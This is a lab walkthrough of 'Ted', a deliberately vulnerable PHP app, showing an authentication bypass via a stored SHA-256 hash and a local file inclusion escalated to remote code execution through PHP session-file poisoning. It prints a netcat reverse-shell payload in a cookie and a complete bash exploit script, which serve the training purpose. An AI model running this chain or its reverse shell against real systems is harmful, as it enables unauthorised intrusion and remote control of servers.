### Ted - Authenticated Local File Inclusion

Within this walkthrough, I will skip any part not related to the web application exploitation, but for sake of consistency I would briefly explain what (and why) I skip.

#### Intro

Ted is really a simple web application. The application is made of only 5 PHP files, so not even close to be an OSWE-like challenge, but it's really worth to be done for guys doing OSCP and OSCE as well. The vulnerability resides in the authenticated part of the application, which is possible to bypass due to its silly login implementation.

#### Vulnerability Discovery

We'll start looking at the index.php file, which contains just a login form, with a post action to authenticate.php 

```html
<form action="authenticate.php" method="post">
```

##### Authentication Bypass

Reviewing the authenticated.php file, it's possible to see that the login functionality seems to be securely using prepared statements:

```php
<?php
// Prepare our SQL, preparing the SQL statement will prevent SQL injection.
if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
    // Bind parameters (s = string, i = int, b = blob, etc), in our case the username is a string so we use "s"
    $stmt->bind_param('s', $_POST['username']);
    $stmt->execute();
    // Store the result so we can check if the account exists in the database.
    $stmt->store_result();
}

if ($stmt->num_rows > 0) {
    $stmt->bind_result($id, $password);
    $stmt->fetch();
?>
```

However, a very silly mistake is made into checking the user password after fetching:

```php
<?php
if ($_POST['password'] ==  $password) {
            // Verification success! User has loggedin!
    ...
} elseif ($_POST['password'] == "admin") {
            echo "<p>Password hash is not correct, make sure to hash it before submit.</p>";
} else {...}
?>
```

Does that actually mean that the hashed version of admin is the right password?
We can access the database directly on Ted, using the credentials provided in `authenticate.php` below:

```php
$DATABASE_HOST = 'localhost';
$DATABASE_USER = 'user';
$DATABASE_PASS = 'password';
$DATABASE_NAME = 'dbname'
```

Let's firstly see with hash is stored in the database, with the following command:

```bash
mysql -uuser -ppassword dbname -e 'select password from accounts where username="admin";' 2>/dev/null | grep -P "[A-Z0-9]+
```
It seems like a sha256 hash; to confirm that, it sufficient to run the following script directly on Ted:

```bash
#!/bin/bash
# Retrieve the hash from the DB
dbhash=$(mysql -uuser -ppassword dbname -e 'select password from accounts where username="admin";' 2>/dev/null | grep -P "[A-Z0-9]+")
# Generate the sha256 of "admin" in uppercase, to match the case of the DB hash
hash=$(printf admin | sha256sum | awk '{print toupper($1)}')
# Compare the two hashes
if [[ "$dbhash" == "$hash" ]]; then
    echo "TRUE"
else
    echo "FALSE"
fi
```

We can now login successfully, so we can start reviewing the authenticated part of the code. Within the `authenticate.php` file, it is possible to see that just after login the user is redirected to `home.php`.

```php
<?php
if ($_POST['password'] ==  $password) {
    ...
    header('Location: home.php');
```

##### Local File Inclusion

Analysing the `home.php`, we can immediately identify at least two vulnerabilities (there is another one but we will talk about it later):

```php
<?php
1. if (isset($_POST['search'])) {
2.     echo "Showing results for ".$_POST['search'].":";
3.     ...
4. } 
5. include($_POST['search']);
```

* At line 2: The search parameter value is reflected back to the user without any prior validation, potentially resulting in a Cross-Site-Scripting (XSS) (Not really important for this exercise)
* At line 5: The search parameter value is included in the page, allowing us to include a local file. To test it, it's enough to insert in the search box `../../../etc/passwd`, the content of the passwd file will be shown.

##### Exploitation

A small note on PHP LFI to RCE:

>There are multiple ways to achieve RCE from LFI in PHP, to exploit Ted it is necessary to have an understanding on how this process works. There are files
on the filesystem which an attacker can modify even not having direct access to the machine, that are the log files. For example, it is possible to write php code in apache access.log with a crafted request, or to the auth.log with a crafted ssh login attempt, and so on. However, these files are usually not accessible to the www-data user, hence not really usable. For a brief list of all the techniques that can be used to achieve RCE, I would suggest going to the following site: [LFI-RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

So, it's only necessary to find the correct file or technique to use. Luckily, seeing the code make this process fairly easy. Indeed, something at the very beginning of the `home.php` file should capture our attention, as for below snippet:

```php
1. <?php
2.    session_start();
3.    if (!isset($_SESSION['loggedin'])) {
4.        header('Location: index.html');
5.        exit();
6.    }
7.    $_SESSION['user_pref'] = $_COOKIE['user_pref']; // Injection point
8. ?>
```

It may not be immediately obvious, if you don't recall how sessions are maintained in PHP. The `$_SESSION` object, indeed, is stored as a file under a predefined path (in this case `/var/lib/php/sessions/`), and name, that is usually obtained concatenating the sess_ prefix with the PHPSESSID value (i.e. `sess_0oqh1580kqa1q9s4srsbnue2b0`).

For that reason, as we can control a value in the $_SESSION object, we can use that to inject a PHP payload in the session file.

If we add the cookie `user_pref=<?php system('nc -e /bin/bash 192.168.226.129 443')?>` to our first call to `home.php` after login, and then we inspect the content of the relative session file, it will look like that:

```bash
root@ubuntu:/var/lib/php/sessions# cat sess_hrcagu6l6tdqfunma6ftltkvj3
loggedin|b:1;name|s:5:"admin";id|i:1;user_pref|s:52:"<?php system('nc -e /bin/bash 192.168.226.129 443')?>";
```

Summarising, in order to exploit the application, we'll undertake the following steps:

1. Login into the application
2. Inject a PHP backdoor in the session file
3. Trigger the backdoor with the LFI vulnerability

The completed exploit:

```bash
#!/bin/bash

proxy="-x http://127.0.0.1:8080"
backdoor="user_pref=<?php system('nc -e /bin/bash 192.168.226.129 443')?>"

echo "[+] Logging In";
cookie=$(curl -ksi -X POST -H "Cookie: PHPSSESID=$cookie" --data-binary 'username=admin&password=8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918'  'http://ted.local/authenticate.php' $proxy | grep 'PHPSESSID' |  awk -F"=" '{print $2}' | tail -n 1 | awk -F";" '{print $1}')
sleep 1
echo "[+] Injecting Backdoor";
curl -ksi -X GET 'http://ted.local/home.php' -H "Cookie: PHPSESSID=$cookie; $backdoor" $proxy &>/dev/null
echo "[+] Getting evil shell..";
sleep 1
curl -ksi -X POST -H "Cookie: PHPSESSID=$cookie; $backdoor" --data-binary "search=../../../var/lib/php/sessions/sess_$cookie" 'http://ted.local/home.php' $proxy &>/dev/null
echo "[+] Done!";
```

#### Conclusions

Ted was somehow a funny machine, however, the small number of files to analyse, and the lack of complexity within the code, made it not enough of a challenge comparing it to the OSWE.
